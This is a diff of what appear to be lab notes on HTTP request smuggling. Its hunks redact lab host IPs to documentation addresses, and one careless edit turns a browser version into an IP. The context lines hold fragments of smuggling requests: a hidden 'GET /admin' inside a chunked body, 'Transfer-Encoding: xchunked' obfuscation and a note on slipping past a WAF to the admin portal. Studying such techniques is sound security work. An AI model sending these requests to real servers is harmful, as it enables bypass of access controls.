@@ -437,7 +437,7 @@ Dummy:
     
     2f
     GET /admin HTTP/1.1
-    Host: 94.237.49.23:32264
+    Host: 198.51.100.12:32264
     
     0
     
@@ -595,10 +595,10 @@ Dummy:
     
     ```python
     GET /comments.php HTTP/1.1
-    Host: 94.237.57.115:43646
+    Host: 198.51.100.14:43646
     Accept-Language: en-US,en;q=0.9
     Upgrade-Insecure-Requests: 1
-    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/198.51.100.0 Safari/537.36
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
     Accept-Encoding: gzip, deflate, br
     Connection: keep-alive
@@ -608,7 +608,7 @@ Dummy:
     0
     
     POST /comments.php HTTP/1.1
-    Host: 94.237.57.115:43646
+    Host: 198.51.100.14:43646
     Content-Length: 300
     Content-Type: application/x-www-form-urlencoded
     Cookie: PHPSESSID=5vfgic2dfm0au47kbnsk8r5d2r
@@ -731,7 +731,7 @@ Dummy:
 
 ```python
 POST /doesnotexists HTTP/1.1
-Host: 94.237.49.23:52600
+Host: 198.51.100.12:52600
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 224
 Transfer-Encoding: xchunked
@@ -761,7 +761,7 @@ Remember that our WAF blocks all external access to the admin portal and it can 
 
 ```python
 GET /doesnotexists HTTP/1.1
-Host: 94.237.49.23:52600
+Host: 198.51.100.12:52600
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 4
 Transfer-Encoding: xchunked
